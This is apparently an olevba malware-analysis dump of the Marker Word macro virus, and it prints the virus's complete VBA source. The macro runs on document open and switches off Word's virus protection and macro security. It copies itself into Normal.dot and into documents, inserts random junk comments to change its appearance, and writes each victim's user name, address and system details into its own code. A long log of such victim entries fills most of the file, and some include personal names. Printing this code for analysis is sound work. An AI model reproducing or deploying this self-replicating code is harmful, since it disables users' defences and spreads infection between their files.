olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.kk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.kk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
'@@yz†”I�Ÿx�t�X^m„›�vY•HŽSiwOCXUŸo}_^‹HW–hf�
    Randomize Timer
'@@QzžyXkhb…F›—O‘q�”i¤Šƒd£l�{�—X]’{™NQO„}jzF…ŒR‡„Yukkn‹l‚[BŠ�Ÿd—Gp}•TOˆfXf\]A�XZ‘o¡Š{ŒtR^‘Ipw
    Const Marker = "1234567890!@#$%^&*()_"
'@@—…sk£¡CD’ŒH›o\^JzV£’^�RDz^EZ„žx��Meb�O�¤¢Vœ…T�–›Š¢£ŸvHnnnT…\�A¡sGym•¢^RRˆQwdqPŸcX |s
    On Error Resume Next
'@@�ŠR…^¤ts}Gz’lu€aE‰zA‹{d––{~x{Q—K[d‘£��‘€LB‡Lfa�N’’IP]B–ž—�iSŠyCtcOb…Ž_
    Dim Src, Dst As Object
'@@¤i£\D�|oŽ|ŽA aB_[FMY•fWHZ†’�‘Pf}W€D|vK…ˆUWR¢vO•˜`}aO…Yq„\SŽˆ€—…d•LwThrr_f•
    Dim S As String
'@@n’Oiwayt^C“•W…‹‹—EHŠQw|`YQl�_{€Y—x¢‡VwKYJƒ�c�ŒvZ�’mwž~W™Oz¤~KŠ¡~x_�’]eD gŽ¤“�‰”nŠ
    Application.Options.SaveNormalPrompt = False
'@@PzbQ�`wzŠOV_vJ{Ž„W‘tk\Ÿm•„FoBˆz_{££ywO‡JT�Uro‰kFieiˆžpPoœK”œa’L
    Application.Options.VirusProtection = False
'@@˜I•{†FšŽgp
    System.ProfileString("Security", "Level") = "0"
    'Îïðåäåëèì èñòî÷íèêè è ïîëó÷àòåëè òåëà
    If ThisDocument.Name = "Normal.dot" Then
'@@q^›˜�ANcJLŸŽpXCiW_QP…EŒTg�mš]dK�ix
     Set Dst = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
'@@†€t
     Set Src = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
'@@�•pK|O–aGwqSnˆOž`L^‰p\LyWj�v„[ UjJwdhM�žHEh[
    Else
'@@•Srrž‘^liˆ�u…s‘|_d`JB™J HFŠ‰˜x“¤ŠVfA¤”ywbS‚JeYZXm�„ZŒ¤‹F�ˆ‚^Ss[�CZnNnœž{ˆwJX}w\g`
     Set Src = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
'@@URpk†pr�{HO�££hbƒPp
     Set Dst = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
'@@“bT”¤Vz�^’{…’Mb†eB\_mb›œhdqr™eUc|mH]ajž‡`œ\gipcPk‚]Md~k›
    End If
'@@ �EC‘ŒŒLL`•”]Iœ‚Ÿ¢•\Hšpt]Žwkl–œŠoQDlkb~‡—y|Dc�bc”KD[š‰E’‘}“vŠ•`ƒ‹Ž
    If Not Dst.Find(Marker, 1, 1, -1, -1) Then
'@@X~Mc˜lUŒ¡eA�™E W–a‘›iU“E{ITWtP|gOPRU[\~ƒ�j{—O|aKaƒzV|[‰OŸEP�uJœCl�~MŽDyX“šM^‚‚jE’POhk
     Src.InsertLines Src.CountOfLines + 1, ""
'@@�¢cO¢A�rJ`CqYŠk|`†Uk‰lMtW™U]K›e_‡`Žmwd[ljmJ•‡Z˜R¢›ŒZ�vœš�DVŽAIWyphc
     Src.InsertLines Src.CountOfLines + 1, "'" & Now() & " "
'@@FY_TpW˜R†]�ho£ iQ¢ž–™“}i‹£Q”nK[lU
     Src.InsertLines Src.CountOfLines + 1, "'" & Application.UserName & " " & Application.UserAddress
'@@uƒ‚šWEcyW\WnT�r�Iƒ…�Ž ¢�Hh�£žt€L”ML£xVbLJJl—š�m¤
     Src.InsertLines Src.CountOfLines + 1, "'" & System.OperatingSystem & " " & System.Version & " " & System.ProcessorType
'@@}bhMTeJšv‚x�eBRN—AD\q^¡`MXŠ
     Src.InsertLines Src.CountOfLines + 1, ""
'@@wƒ�i AYF�zdrvTdQŽ£„bPpy�~›O�ƒ�|^Ž’ŒhA“•¤›Yo‘„x
     For i = 1 To Src.CountOfLines
'@@vsW‚b\†Mrh�†j¢Z£’VweOC£‰bžDn‰X›�^dePEt“V’~‚€Kd�kiƒtsw_~kp�}dQrhl“KHTgP¤hNEKA�HunqšgUvM˜o•Y~
      S = Src.Lines(i, 1)
'@@C‹TnxtB’XphS™p”“_j‚}
      If Len(S) > 0 And InStr(1, S, "'" & Chr(64) & Chr(64)) > 0 Then
'@@†‘s£Œžf“IˆBVZle™h”DuŒPLn„pO~ƒ`i‹”lj“rž‡”Jy•€`^
       S = "'" & Chr(64) & Chr(64)
'@@VsTšO\lˆZl†£~Kƒg‰Kž£ ~E¡\F’‡TU�  €‹kA`iu†vOfVB–H“^ X]ij‡yŠM€‘Tp‡tyO‚
       For k = 1 To Int(Rnd * 100)
'@@QV
        S = S + Chr(Int(Rnd * 100) + 65)
'@@RŒqc`ƒ
       Next
'@@BmQOU
      End If
'@@NTlJžQ‚ezKn^HF~IJB˜K˜ež’ci‰£sRœOIx‡\ky’�€¢Œ‡ŸLcLh¡qš…nQ€cHŠ—K‡irw�Dt¤¤
      Dst.InsertLines i, S
'@@¢�XMO¡A—BbWkŸ
     Next
'@@iI„žV|qŠeˆƒ�~¡WjL�”™EJD›eU…VŸWƒo–†”h£’YS”–yLB‘ozf\€yTŽx—jD^]jnAqFCBvžxX�˜J�”‰ƒŸDeTTž¡�†Or¡˜iu‰
     NormalTemplate.Save
'@@ŸSPHDq“‚’�PJhU~P�t“bžjJ—shWnJ™^˜LN
    End If
'@@~¤nX€�„_oY”[zXM‘›Mx†oW{�b} ™–~nA–Œ˜pwˆUL „¢Ržl‘z`”\ide¡ˆrG“tX„‡DlAU]ƒ}��££s—£SagŠ
    If (Day(Now()) = 13) And (Month(Now()) = 10) Then
'@@e‡ˆŒ”‹nPDS]t|Œ\N Y_Ša›]X‘
        MsgBox "Ïîçäðàâëÿþ ñåáÿ ñ Äåíì Ðîæäåíèÿ!", vbOKOnly, "Óðà!!!!"
'@@VgŠCaeQ¢Ivty{q|‹F_‹�‹E`�£wf]tjƒ¢E_�rLl�iObUQŽšgao|]™[E�ž ŠxxbGd¢“}��\~G^G
    End If
'@@VEh^n`›D“rQ—ve“ZriV�B‰“zIqž`�Aj¡£Iˆˆ¤vQSiIl˜Bgd™˜gœ•h™qN�gk_{NŠ•ŒsSG€trcg‡š{ƒ
End Sub


'15.06.2001 15:38:13
'Êàðòîõèí Ðóñëàí
'Windows 4.10 Pentium


'21.06.2001 20:05:51
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'25.06.2001 12:50:05
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'28.06.2001 14:21:58
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'28.06.2001 14:48:58
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'29.06.2001 18:00:56
'pvi
'Windows NT 4.0 Pentium


'04.07.2001 15:08:04
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'04.07.2001 15:09:31
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'04.07.2001 16:29:01
'pvi
'Windows NT 4.0 Pentium


'05.07.2001 18:46:35
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'05.07.2001 18:47:21
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'05.07.2001 19:42:31
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'05.07.2001 19:42:41
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'05.07.2001 19:42:43
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'06.07.2001 12:48:54
'pvi
'Windows NT 4.0 Pentium


'06.07.2001 16:48:10
'pvi
'Windows NT 4.0 Pentium


'07.07.01 17:17:49
'Õðîìåíêîâ
'Windows NT 4.0 Pentium


'10.07.01 18:04:09
'pvi
'Windows NT 4.0 Pentium


'10.07.01 18:53:01
'pvi
'Windows NT 4.0 Pentium


'10.07.01 18:55:51
'pvi
'Windows NT 4.0 Pentium


'10.07.01 18:56:37
'pvi
'Windows NT 4.0 Pentium


'10.07.01 18:57:16
'pvi
'Windows NT 4.0 Pentium


'10.07.01 18:58:20
'pvi
'Windows NT 4.0 Pentium


'20.07.01 10:02:22
'peter
'Windows NT 4.0 Pentium


'20.07.01 12:44:14
'peter
'Windows NT 4.0 Pentium


'20.07.01 13:34:53
'peter
'Windows NT 4.0 Pentium


'20.07.01 16:03:02
'peter
'Windows NT 4.0 Pentium


'21.07.01 20:14:33
'peter
'Windows NT 4.0 Pentium


'21.07.01 21:13:22
'peter
'Windows NT 4.0 Pentium


'22.07.01 15:16:25
'peter
'Windows NT 4.0 Pentium


'22.07.01 14:56:11
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 16:06:09
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 16:06:52
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 18:06:20
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 18:06:52
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 19:10:01
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 19:47:31
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 19:49:04
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 19:53:44
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 19:53:45
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 19:55:44
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 19:56:31
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 21:03:42
'Administrator
'Windows NT 4.0 Pentium


'22.07.01 21:04:36
'Administrator
'Windows NT 4.0 Pentium


'23.07.01 18:32:02
'Administrator
'Windows NT 4.0 Pentium


'25.07.01 11:44:12
'Administrator
'Windows NT 4.0 Pentium


'27.07.01 13:09:42
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 11:00:11
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 11:00:14
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 11:00:15
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 11:10:49
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 11:42:25
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 11:43:44
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 13:39:39
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 13:40:02
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 13:40:54
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 13:41:37
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 13:41:38
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 13:42:36
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 13:42:59
'Administrator
'Windows NT 4.0 Pentium


'28.07.01 13:43:20
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:01:30
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:01:37
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:01:43
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:03:15
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:04:47
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:06:54
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:07:44
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:09:29
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:11:35
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:12:55
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:14:15
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:17:15
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:18:22
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:21:25
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:22:13
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:24:44
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:28:53
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:30:52
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:35:16
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:37:02
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:38:51
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:40:33
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:41:53
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:43:23
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:46:44
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:49:01
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:50:48
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:52:15
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:53:45
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:55:19
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:56:39
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:56:42
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 10:56:43
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:00:09
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:04:24
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:05:12
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:05:53
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:07:35
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:08:27
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:09:08
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:11:32
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:13:09
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:14:07
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:15:24
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:16:20
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:19:15
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:20:25
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:21:18
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:21:21
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:23:47
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:25:52
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:26:49
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:28:02
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:29:37
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:30:39
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:32:50
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:35:21
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:36:39
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:39:12
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:40:45
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:42:45
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:43:58
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:45:29
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:46:13
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:47:18
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:48:37
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:52:51
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:54:45
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 11:55:54
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:01:13
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:01:59
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:02:39
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:03:46
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:23:27
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:24:04
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:26:09
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:28:10
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:29:06
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:30:14
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:37:30
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:38:26
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:39:51
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:42:01
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:44:03
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:45:23
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:46:58
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:47:24
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:48:53
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:50:04
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:50:55
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:51:33
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:53:54
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:55:03
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:56:18
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:58:42
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 12:59:38
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:00:55
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:02:28
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:04:37
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:09:05
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:10:59
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:13:28
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:14:36
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:15:48
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:19:57
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:19:59
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:23:16
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:24:06
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:25:40
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:26:59
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:30:06
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:31:32
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:33:27
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:35:56
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:37:50
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:40:36
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:42:21
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:43:17
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:44:03
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:46:17
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:48:55
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:50:11
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:50:35
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:52:06
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:52:58
'Administrator
'Windows NT 4.0 Pentium


'29.07.01 13:53:28
'Administrator
'Windows NT 4.0 Pentium


'30.07.01 9:38:51
'Administrator
'Windows NT 4.0 Pentium


'30.07.01 11:45:46
'Administrator
'Windows NT 4.0 Pentium


'30.07.01 13:36:30
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 7:27:41
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 10:13:14
'Administrator
'Windows NT 4.0 Pentium


'01.08.01 9:53:22
'Administrator
'Windows NT 4.0 Pentium


'01.08.01 10:03:16
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 11:05:56
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 11:06:14
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 11:06:26
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 11:15:10
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 11:15:29
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 11:59:44
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 12:01:36
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 12:02:03
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 14:14:53
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 18:52:30
'Administrator
'Windows NT 4.0 Pentium


'31.07.01 18:52:32
'Administrator
'Windows NT 4.0 Pentium


'01.08.01 19:32:01
'Administrator
'Windows NT 4.0 Pentium


'02.08.01 17:12:17
'Administrator
'Windows NT 4.0 Pentium


'05.08.01 12:31:04
'Administrator
'Windows NT 4.0 Pentium


'06.08.01 18:34:19
'Administrator
'Windows NT 4.0 Pentium


'06.08.01 18:35:20
'Administrator
'Windows NT 4.0 Pentium


'06.08.01 18:35:22
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 16:16:25
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 16:17:15
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 16:17:29
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 16:22:15
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 16:25:38
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 18:33:53
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 18:35:54
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 18:45:19
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 18:45:32
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 18:46:03
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 19:01:19
'Administrator
'Windows NT 4.0 Pentium


'08.08.01 19:01:35
'Administrator
'Windows NT 4.0 Pentium


'09.08.01 10:28:26
'Administrator
'Windows NT 4.0 Pentium


'09.08.01 11:09:09
'Administrator
'Windows NT 4.0 Pentium


'09.08.01 14:08:57
'Administrator
'Windows NT 4.0 Pentium


'09.08.01 16:12:50
'Administrator
'Windows NT 4.0 Pentium


'09.08.01 16:13:57
'Administrator
'Windows NT 4.0 Pentium


'09.08.01 16:17:08
'Administrator
'Windows NT 4.0 Pentium


'11.08.01 15:16:28
'Administrator
'Windows NT 4.0 Pentium


'12.08.01 9:10:13
'Administrator
'Windows NT 4.0 Pentium


'13.08.01 12:15:11
'Administrator
'Windows NT 4.0 Pentium


'14.08.01 10:14:18
'Administrator
'Windows NT 4.0 Pentium


'15.08.01 12:28:18
'Administrator
'Windows NT 4.0 Pentium


'15.08.01 14:39:13
'Administrator
'Windows NT 4.0 Pentium


'25.08.01 13:25:30
'Administrator
'Windows NT 4.0 Pentium


'25.08.01 13:27:51
'Administrator
'Windows NT 4.0 Pentium


'25.08.01 17:05:32
'Administrator
'Windows NT 4.0 Pentium


'25.08.01 17:06:46
'Administrator
'Windows NT 4.0 Pentium


'25.08.01 17:07:10
'Administrator
'Windows NT 4.0 Pentium


'25.08.01 17:08:38
'Administrator
'Windows NT 4.0 Pentium


'29.08.01 9:19:53
'Administrator
'Windows NT 4.0 Pentium


'31.08.01 14:51:40
'Administrator
'Windows NT 4.0 Pentium


'01.09.01 11:54:22
'Administrator
'Windows NT 4.0 Pentium


'01.09.01 14:21:45
'Administrator
'Windows NT 4.0 Pentium


'01.09.01 14:23:42
'Administrator
'Windows NT 4.0 Pentium


'03.09.01 10:52:52
'Administrator
'Windows NT 4.0 Pentium


'07.09.01 7:55:21
'Administrator
'Windows NT 4.0 Pentium


'07.09.01 14:59:35
'Administrator
'Windows NT 4.0 Pentium


'09.09.01 8:29:58
'Administrator
'Windows NT 4.0 Pentium


'09.09.01 9:47:49
'Administrator
'Windows NT 4.0 Pentium


'10.09.01 7:20:01
'Administrator
'Windows NT 4.0 Pentium


'10.09.01 7:46:33
'Administrator
'Windows NT 4.0 Pentium


'10.09.01 7:47:12
'Administrator
'Windows NT 4.0 Pentium


'10.09.01 9:04:53
'Administrator
'Windows NT 4.0 Pentium


'10.09.01 9:08:06
'Administrator
'Windows NT 4.0 Pentium


'10.09.01 9:10:17
'Administrator
'Windows NT 4.0 Pentium


'10.09.01 9:10:48
'Administrator
'Windows NT 4.0 Pentium


'10.09.01 9:14:42
'Administrator
'Windows NT 4.0 Pentium


'10.09.01 10:33:31
'Administrator
'Windows NT 4.0 Pentium


'10.09.01 12:16:48
'Administrator
'Windows NT 4.0 Pentium


'10/23/01 3:18:31 PM
'Adminis
'Windows NT 4.0 Pentium


'10/23/01 4:46:15 PM
'Adminis
'Windows NT 4.0 Pentium


'10/23/01 4:46:35 PM
'Adminis
'Windows NT 4.0 Pentium


'10/25/01 11:37:38 AM
'Adminis
'Windows NT 4.0 Pentium


'10/25/01 11:54:13 AM
'Adminis
'Windows NT 4.0 Pentium


'10/25/01 11:55:45 AM
'Adminis
'Windows NT 4.0 Pentium


'10/25/01 12:18:50 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 2:31:28 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 2:32:29 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 2:33:22 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:01:50 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:04:24 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:11:53 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:14:07 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:16:24 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:19:29 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:20:49 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:22:44 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:23:19 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:23:47 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:24:35 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:25:19 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:25:51 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:26:42 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:29:09 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:30:49 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:31:33 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:33:46 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:34:02 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:34:29 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:36:23 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:37:03 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:38:27 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:46:55 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:48:43 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:49:45 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:50:07 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:54:02 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:55:07 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:55:27 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:56:38 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:57:39 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:57:57 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 3:59:40 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:00:55 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:03:52 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:04:14 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:04:43 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:05:51 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:07:46 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:08:16 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:08:31 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:08:46 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:09:03 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:09:54 PM
'Adminis
'Windows NT 4.0 Pentium


'10/27/01 4:14:26 PM
'Adminis
'Windows NT 4.0 Pentium


'10/29/01 12:04:06 PM
'Adminis
'Windows NT 4.0 Pentium


'12.11.2000 17:22:50
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 17:29:30
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:29:39
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:30:19
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:30:36
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:31:20
'adminis
'Windows NT 5.0 Pentium


'12.11.2000 20:33:00
